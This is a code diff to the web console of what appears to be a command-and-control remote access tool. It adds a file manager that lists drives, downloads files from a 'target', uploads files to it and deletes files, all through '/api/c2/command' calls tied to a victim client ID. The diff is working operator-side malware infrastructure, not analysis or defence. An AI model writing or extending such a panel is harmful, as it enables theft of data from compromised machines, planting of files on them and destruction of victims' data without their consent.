@@ -674,12 +674,46 @@
             <div class="module-panel" id="mod-file-manager">
                 <header class="header">
                     <h2>File Manager</h2>
-                    <p class="subtitle">Browse, download, and upload files on the target</p>
+                    <p class="subtitle">Browse, download, upload and delete files on the target</p>
                 </header>
                 <div class="panel-card">
-                    <div class="module-placeholder">
-                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
-                        <span>File Manager — coming soon</span>
+                    <!-- Toolbar -->
+                    <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
+                        <button class="btn btn-secondary" id="fm-btn-up" onclick="fmNavigateUp()" style="padding:6px 12px;font-size:12px;" disabled>
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:4px;vertical-align:middle;"><polyline points="18 15 12 9 6 15"/></svg>Up
+                        </button>
+                        <button class="btn btn-secondary" onclick="fmRefresh()" style="padding:6px 12px;font-size:12px;">
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:4px;vertical-align:middle;"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>Refresh
+                        </button>
+                        <button class="btn btn-secondary" id="fm-btn-download" onclick="fmDownloadSelected()" style="padding:6px 12px;font-size:12px;" disabled>
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:4px;vertical-align:middle;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download
+                        </button>
+                        <button class="btn btn-danger" id="fm-btn-delete" onclick="fmDeleteSelected()" style="padding:6px 12px;font-size:12px;" disabled>
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:4px;vertical-align:middle;"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/></svg>Delete
+                        </button>
+                        <label class="btn btn-secondary" style="padding:6px 12px;font-size:12px;cursor:pointer;margin:0;">
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right:4px;vertical-align:middle;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>Upload
+                            <input type="file" id="fm-upload-input" style="display:none;" onchange="fmUploadFile(this)">
+                        </label>
+                        <span id="fm-status" style="font-size:12px;color:var(--text-muted);margin-left:4px;"></span>
+                    </div>
+                    <!-- Breadcrumb -->
+                    <div id="fm-breadcrumb" style="display:flex;align-items:center;gap:4px;padding:6px 10px;background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:6px;margin-bottom:10px;font-size:12px;font-family:var(--font-mono);flex-wrap:wrap;min-height:32px;"></div>
+                    <!-- File Table -->
+                    <div style="overflow-x:auto;border:1px solid var(--border-color);border-radius:8px;">
+                        <table style="width:100%;border-collapse:collapse;font-size:13px;">
+                            <thead>
+                                <tr style="background:rgba(255,255,255,0.04);text-align:left;">
+                                    <th style="padding:9px 12px;color:var(--text-muted);font-weight:500;width:36px;"></th>
+                                    <th style="padding:9px 12px;color:var(--text-muted);font-weight:500;">Name</th>
+                                    <th style="padding:9px 12px;color:var(--text-muted);font-weight:500;width:90px;">Size</th>
+                                    <th style="padding:9px 12px;color:var(--text-muted);font-weight:500;width:140px;">Modified</th>
+                                </tr>
+                            </thead>
+                            <tbody id="fm-tbody">
+                                <tr><td colspan="4" style="text-align:center;padding:40px;color:var(--text-muted);">Click Refresh to load files</td></tr>
+                            </tbody>
+                        </table>
                     </div>
                 </div>
             </div>
@@ -1248,6 +1282,261 @@ C:\&gt;</div>
                 screen.scrollTop = screen.scrollHeight;
             }
         };
+
+        // ===== FILE MANAGER =====
+        let fmCurrentPath = '';
+        let fmSelected = null; // {name, type, path}
+        let fmBusy = false;
+
+        function fmFullPath(name) {
+            if (!fmCurrentPath) return name; // drive selected, name = "C:\"
+            return fmCurrentPath.replace(/\\$/, '') + '\\' + name;
+        }
+
+        function fmGetParent(path) {
+            if (!path) return null;
+            if (/^[A-Za-z]:\\$/.test(path)) return '';
+            path = path.replace(/\\$/, '');
+            let idx = path.lastIndexOf('\\');
+            if (idx < 0) return '';
+            if (idx <= 2) return path.substring(0, 3);
+            return path.substring(0, idx);
+        }
+
+        function fmSetStatus(msg, color) {
+            const el = document.getElementById('fm-status');
+            el.textContent = msg;
+            el.style.color = color || 'var(--text-muted)';
+        }
+
+        function fmUpdateToolbar() {
+            document.getElementById('fm-btn-up').disabled = !fmCurrentPath;
+            const hasSel = !!fmSelected;
+            document.getElementById('fm-btn-download').disabled = !hasSel || fmSelected.type !== 'file';
+            document.getElementById('fm-btn-delete').disabled = !hasSel;
+        }
+
+        function fmRenderBreadcrumb() {
+            const el = document.getElementById('fm-breadcrumb');
+            let html = `<span onclick="fmNavigateTo('')" style="cursor:pointer;color:var(--primary);padding:2px 4px;border-radius:3px;" title="Drives">⊞ Drives</span>`;
+            if (fmCurrentPath) {
+                const parts = fmCurrentPath.replace(/\\$/, '').split('\\').filter(Boolean);
+                let built = '';
+                parts.forEach((part, i) => {
+                    built = i === 0 ? part + '\\' : built.replace(/\\$/, '') + '\\' + part;
+                    const p = built;
+                    html += `<span style="color:var(--text-muted);margin:0 2px;">›</span>`;
+                    html += `<span onclick="fmNavigateTo('${p.replace(/\\/g,'\\\\').replace(/'/g,"\\'")}'')" style="cursor:pointer;color:${i===parts.length-1?'#fff':'var(--primary)'};padding:2px 4px;border-radius:3px;">${part}</span>`;
+                });
+            }
+            el.innerHTML = html;
+        }
+
+        function fmFormatSize(bytes) {
+            if (bytes === 0) return '';
+            if (bytes < 1024) return bytes + ' B';
+            if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+            if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
+            return (bytes / 1073741824).toFixed(2) + ' GB';
+        }
+
+        function fmGetIcon(type, name) {
+            if (type === 'drive') return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#6b9fff" stroke-width="2" style="vertical-align:middle;"><rect x="2" y="7" width="20" height="14" rx="2"/><circle cx="12" cy="14" r="2"/><path d="M6 7V5a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v2"/></svg>';
+            if (type === 'dir') return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#f5c518" stroke-width="2" style="vertical-align:middle;"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>';
+            const ext = name.includes('.') ? name.split('.').pop().toLowerCase() : '';
+            const codeExts = ['cs','py','js','ts','html','css','json','xml','txt','log','md','ini','cfg','conf','bat','cmd','ps1','sh'];
+            const imgExts = ['jpg','jpeg','png','gif','bmp','ico','svg','webp'];
+            const arcExts = ['zip','rar','7z','tar','gz'];
+            const exeExts = ['exe','dll','msi','bin'];
+            if (imgExts.includes(ext)) return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#a855f7" stroke-width="2" style="vertical-align:middle;"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>';
+            if (arcExts.includes(ext)) return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#f97316" stroke-width="2" style="vertical-align:middle;"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>';
+            if (exeExts.includes(ext)) return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" style="vertical-align:middle;"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>';
+            if (codeExts.includes(ext)) return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#22d3ee" stroke-width="2" style="vertical-align:middle;"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>';
+            return '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="var(--text-muted)" stroke-width="2" style="vertical-align:middle;"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>';
+        }
+
+        function fmRenderItems(items, error) {
+            const tbody = document.getElementById('fm-tbody');
+            fmSelected = null;
+            fmUpdateToolbar();
+            if (error) {
+                tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;padding:30px;color:var(--danger,#ef4444);">Error: ${error}</td></tr>`;
+                return;
+            }
+            if (!items || items.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;padding:30px;color:var(--text-muted);">Empty folder</td></tr>`;
+                return;
+            }
+            let html = '';
+            items.forEach(item => {
+                const fullPath = fmCurrentPath ? fmFullPath(item.name) : item.name;
+                const isClickable = item.type === 'dir' || item.type === 'drive';
+                const nameCell = isClickable
+                    ? `<span onclick="fmNavigateTo('${fullPath.replace(/\\/g,'\\\\').replace(/'/g,"\\'")}')" style="cursor:pointer;color:var(--primary);">${item.name}</span>`
+                    : `<span style="color:#fff;">${item.name}</span>`;
+                html += `<tr class="fm-row" data-path="${fullPath.replace(/"/g,'&quot;')}" data-type="${item.type}" data-name="${item.name.replace(/"/g,'&quot;')}"
+                    onclick="fmSelectRow(this)" ondblclick="fmDblClick(this)"
+                    style="border-top:1px solid rgba(255,255,255,0.05);cursor:pointer;transition:background 0.1s;">
+                    <td style="padding:8px 12px;">${fmGetIcon(item.type, item.name)}</td>
+                    <td style="padding:8px 12px;">${nameCell}</td>
+                    <td style="padding:8px 12px;color:var(--text-muted);font-family:var(--font-mono);font-size:12px;">${fmFormatSize(item.size)}</td>
+                    <td style="padding:8px 12px;color:var(--text-muted);font-family:var(--font-mono);font-size:12px;">${item.modified || ''}</td>
+                </tr>`;
+            });
+            tbody.innerHTML = html;
+        }
+
+        window.fmSelectRow = function(row) {
+            document.querySelectorAll('.fm-row').forEach(r => r.style.background = '');
+            row.style.background = 'rgba(99,102,241,0.15)';
+            fmSelected = { name: row.dataset.name, type: row.dataset.type, path: row.dataset.path };
+            fmUpdateToolbar();
+        };
+
+        window.fmDblClick = function(row) {
+            const type = row.dataset.type;
+            const path = row.dataset.path;
+            if (type === 'dir' || type === 'drive') fmNavigateTo(path);
+            else if (type === 'file') fmDownloadSelected();
+        };
+
+        window.fmNavigateTo = async function(path) {
+            if (fmBusy) return;
+            fmBusy = true;
+            fmSetStatus('Loading...', 'var(--text-muted)');
+            document.getElementById('fm-tbody').innerHTML = '<tr><td colspan="4" style="text-align:center;padding:30px;color:var(--text-muted);">Loading...</td></tr>';
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: 'fm_list:' + path })
+                });
+                let attempts = 0;
+                const poll = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 30) { clearInterval(poll); fmSetStatus('Timeout', '#ef4444'); fmBusy = false; return; }
+                    const r = await fetch('/api/c2/fm/result/' + encodeURIComponent(clientId));
+                    const data = await r.json();
+                    if (data && data.type === 'fm_list_res') {
+                        clearInterval(poll);
+                        fmCurrentPath = data.path || '';
+                        fmRenderBreadcrumb();
+                        fmRenderItems(data.items, data.error);
+                        fmSetStatus(data.items ? data.items.length + ' items' : '', 'var(--text-muted)');
+                        fmUpdateToolbar();
+                        fmBusy = false;
+                    }
+                }, 400);
+            } catch (e) { fmSetStatus('Error: ' + e.message, '#ef4444'); fmBusy = false; }
+        };
+
+        window.fmNavigateUp = function() {
+            const parent = fmGetParent(fmCurrentPath);
+            if (parent !== null) fmNavigateTo(parent);
+        };
+
+        window.fmRefresh = function() { fmNavigateTo(fmCurrentPath); };
+
+        window.fmDownloadSelected = async function() {
+            if (!fmSelected || fmSelected.type !== 'file' || fmBusy) return;
+            fmBusy = true;
+            fmSetStatus('Downloading...', 'var(--text-muted)');
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: 'fm_download:' + fmSelected.path })
+                });
+                let attempts = 0;
+                const poll = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 60) { clearInterval(poll); fmSetStatus('Download timeout', '#ef4444'); fmBusy = false; return; }
+                    const r = await fetch('/api/c2/fm/result/' + encodeURIComponent(clientId));
+                    const data = await r.json();
+                    if (data && data.type === 'fm_download_res') {
+                        clearInterval(poll);
+                        if (data.error) { fmSetStatus('Error: ' + data.error, '#ef4444'); fmBusy = false; return; }
+                        const bytes = Uint8Array.from(atob(data.data), c => c.charCodeAt(0));
+                        const blob = new Blob([bytes]);
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url; a.download = data.name || fmSelected.name;
+                        document.body.appendChild(a); a.click();
+                        document.body.removeChild(a); URL.revokeObjectURL(url);
+                        fmSetStatus('Downloaded: ' + data.name, '#22c55e');
+                        fmBusy = false;
+                    }
+                }, 500);
+            } catch (e) { fmSetStatus('Error: ' + e.message, '#ef4444'); fmBusy = false; }
+        };
+
+        window.fmDeleteSelected = async function() {
+            if (!fmSelected || fmBusy) return;
+            if (!confirm('Delete "' + fmSelected.name + '"?\nThis cannot be undone.')) return;
+            fmBusy = true;
+            fmSetStatus('Deleting...', 'var(--text-muted)');
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: 'fm_delete:' + fmSelected.path })
+                });
+                let attempts = 0;
+                const poll = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 20) { clearInterval(poll); fmSetStatus('Timeout', '#ef4444'); fmBusy = false; return; }
+                    const r = await fetch('/api/c2/fm/result/' + encodeURIComponent(clientId));
+                    const data = await r.json();
+                    if (data && data.type === 'fm_delete_res') {
+                        clearInterval(poll);
+                        if (data.success) { fmSetStatus('Deleted', '#22c55e'); fmRefresh(); }
+                        else { fmSetStatus('Error: ' + (data.error || 'failed'), '#ef4444'); fmBusy = false; }
+                    }
+                }, 400);
+            } catch (e) { fmSetStatus('Error: ' + e.message, '#ef4444'); fmBusy = false; }
+        };
+
+        window.fmUploadFile = async function(input) {
+            const file = input.files[0];
+            if (!file) return;
+            if (file.size > 52428800) { fmSetStatus('File too large (>50MB)', '#ef4444'); input.value = ''; return; }
+            const destPath = fmCurrentPath
+                ? (fmCurrentPath.replace(/\\$/, '') + '\\' + file.name)
+                : file.name;
+            if (!confirm('Upload "' + file.name + '" to ' + (fmCurrentPath || 'root') + '?')) { input.value = ''; return; }
+            fmBusy = true;
+            fmSetStatus('Uploading...', 'var(--text-muted)');
+            try {
+                const form = new FormData();
+                form.append('file', file);
+                form.append('path', destPath);
+                await fetch('/api/c2/fm/upload/' + encodeURIComponent(clientId), { method: 'POST', body: form });
+                let attempts = 0;
+                const poll = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 30) { clearInterval(poll); fmSetStatus('Upload timeout', '#ef4444'); fmBusy = false; return; }
+                    const r = await fetch('/api/c2/fm/result/' + encodeURIComponent(clientId));
+                    const data = await r.json();
+                    if (data && data.type === 'fm_upload_res') {
+                        clearInterval(poll);
+                        if (data.success) { fmSetStatus('Uploaded: ' + file.name, '#22c55e'); fmRefresh(); }
+                        else { fmSetStatus('Error: ' + (data.error || 'failed'), '#ef4444'); fmBusy = false; }
+                    }
+                }, 500);
+            } catch (e) { fmSetStatus('Error: ' + e.message, '#ef4444'); fmBusy = false; }
+            input.value = '';
+        };
+
+        // Auto-load drives when File Manager tab is activated
+        document.querySelectorAll('.module-nav-item').forEach(btn => {
+            if (btn.dataset.module === 'file-manager') {
+                btn.addEventListener('click', () => {
+                    if (document.getElementById('fm-tbody').textContent.includes('Click Refresh')) {
+                        fmNavigateTo('');
+                    }
+                });
+            }
+        });
 
         // Task Manager
         window.fetchTaskManagerList = async function() {
